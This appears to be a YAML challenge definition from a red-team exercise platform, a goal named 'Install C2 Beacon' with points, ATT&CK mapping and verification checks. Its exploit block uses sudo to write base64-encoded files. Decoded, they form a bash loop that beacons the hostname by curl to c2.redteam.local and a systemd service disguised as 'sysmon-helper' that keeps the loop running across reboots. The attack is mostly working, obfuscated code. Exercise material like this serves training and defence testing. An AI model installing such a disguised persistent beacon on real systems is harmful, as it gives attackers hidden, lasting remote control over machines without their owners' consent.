id: install_c2
name: Install C2 Beacon
description: Install a persistent command-and-control beacon that survives reboots, demonstrating full compromise of the target system.
type: goal
difficulty: hard
points: 0
red_points: 500
defend_points: 350
category: command-and-control
tags: [c2, persistence, command-and-control]
conflicts: []
requires: [nopasswd_sudo]

caldera:
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: "Remote Access Software"
  exploit:
    description: "Install a persistent beacon via systemd service"
    command: |
      sudo systemctl unmask sysmon-helper
      sudo python3 -c "import base64;open('/tmp/beacon.sh','wb').write(base64.b64decode('IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICBob3N0PSIkKGhvc3RuYW1lKSIKICBjdXJsIC1zayAiaHR0cDovL2MyLnJlZHRlYW0ubG9jYWwvYmVhY29uP2hvc3Q9JHtob3N0fSIgfHwgdHJ1ZQogIHNsZWVwIDMwMApkb25lCg=='))"
      sudo chmod +x /tmp/beacon.sh
      sudo python3 -c "import base64;open('/etc/systemd/system/sysmon-helper.service','wb').write(base64.b64decode('W1VuaXRdCkRlc2NyaXB0aW9uPVN5c3RlbSBNb25pdG9yIEhlbHBlcgpBZnRlcj1uZXR3b3JrLnRhcmdldApbU2VydmljZV0KRXhlY1N0YXJ0PS90bXAvYmVhY29uLnNoClJlc3RhcnQ9YWx3YXlzCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo='))"
      sudo systemctl daemon-reload && sudo systemctl enable sysmon-helper && sudo systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"

verification:
  type: service_running
  service: sysmon-helper
  expected: active

revert_verification:
  type: service_running
  service: sysmon-helper
  expected: inactive
